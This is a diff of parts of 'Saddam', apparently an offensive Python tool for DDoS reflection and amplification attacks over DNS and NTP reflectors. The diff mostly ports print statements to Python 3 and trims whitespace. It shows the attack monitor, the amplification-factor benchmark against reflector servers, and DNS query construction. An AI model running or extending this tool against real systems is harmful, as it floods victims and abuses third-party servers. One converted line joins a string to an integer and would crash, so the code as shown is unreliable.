@@ -14,11 +14,11 @@ USAGE = '''
 '''
 
 LOGO = r'''
-	   _____           __    __              
-	  / ___/____ _____/ /___/ /___ _____ ___ 
+	   _____           __    __
+	  / ___/____ _____/ /___/ /___ _____ ___
 	  \__ \/ __ `/ __  / __  / __ `/ __ `__ \
 	 ___/ / /_/ / /_/ / /_/ / /_/ / / / / / /
-	/____/\__,_/\__,_/\__,_/\__,_/_/ /_/ /_/ 
+	/____/\__,_/\__,_/\__,_/\__,_/_/ /_/ /_/
 	https://github.com/OffensivePython/Saddam
 	   https://twitter.com/OffensivePython
 '''
@@ -119,7 +119,7 @@ def Monitor():
 	'''
 		Monitor attack
 	'''
-	print ATTACK
+	print(ATTACK)
 	FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
 	start = time.time()
 	while True:
@@ -127,23 +127,23 @@ def Monitor():
 			current = time.time() - start
 			bps = (nbytes*8)/current
 			pps = npackets/current
-			out = FMT.format(Calc(npackets, 1000), 
+			out = FMT.format(Calc(npackets, 1000),
 				Calc(nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
 			sys.stderr.write('\r{}{}'.format(out, ' '*(60-len(out))))
 			time.sleep(1)
 		except KeyboardInterrupt:
-			print '\nInterrupted'
+			print('\nInterrupted')
 			break
 		except Exception as err:
-			print '\nError:', str(err)
+			print('\nError:', str(err))
 			break
-			
+
 
 def AmpFactor(recvd, sent):
 	return '{}x ({}B -> {}B)'.format(recvd/sent, sent, recvd)
 
 def Benchmark(ddos):
-	print BENCHMARK
+	print(BENCHMARK)
 	i = 0
 	for proto in files:
 		f = open(files[proto][FILE_NAME], 'r')
@@ -155,18 +155,17 @@ def Benchmark(ddos):
 						i+= 1
 						recvd, sent = ddos.GetAmpSize(proto, soldier, domain)
 						if recvd/sent:
-							print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
-								AmpFactor(recvd, sent), domain)
+							print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, AmpFactor(recvd, sent), domain))
 						else:
 							continue
 				else:
 					recvd, sent = ddos.GetAmpSize(proto, soldier)
-					print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
-						AmpFactor(recvd, sent), 'N/A')
+					print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier,
+						AmpFactor(recvd, sent), 'N/A'))
 					i+= 1
 			else:
 				break
-		print 'Total tested:', i
+		print('Total tested:' + i)
 		f.close()
 
 class DDoS(object):
@@ -216,7 +215,7 @@ class DDoS(object):
 		return len(data), len(packet)
 	def __GetQName(self, domain):
 		'''
-			QNAME A domain name represented as a sequence of labels 
+			QNAME A domain name represented as a sequence of labels
 			where each label consists of a length
 			octet followed by that number of octets
 		'''
@@ -293,7 +292,7 @@ def main():
 		if domains:
 			files['dns'] = [dns_file]
 		else:
-			print 'Specify domains to resolve (e.g: --dns=dns.txt:evildomain.com)'
+			print('Specify domains to resolve (e.g: --dns=dns.txt:evildomain.com)')
 			sys.exit()
 	if options.ntp:
 		files['ntp'] = [options.ntp]
@@ -317,5 +316,5 @@ def main():
 		sys.exit()
 
 if __name__=='__main__':
-	print LOGO
+	print(LOGO)
 	main()
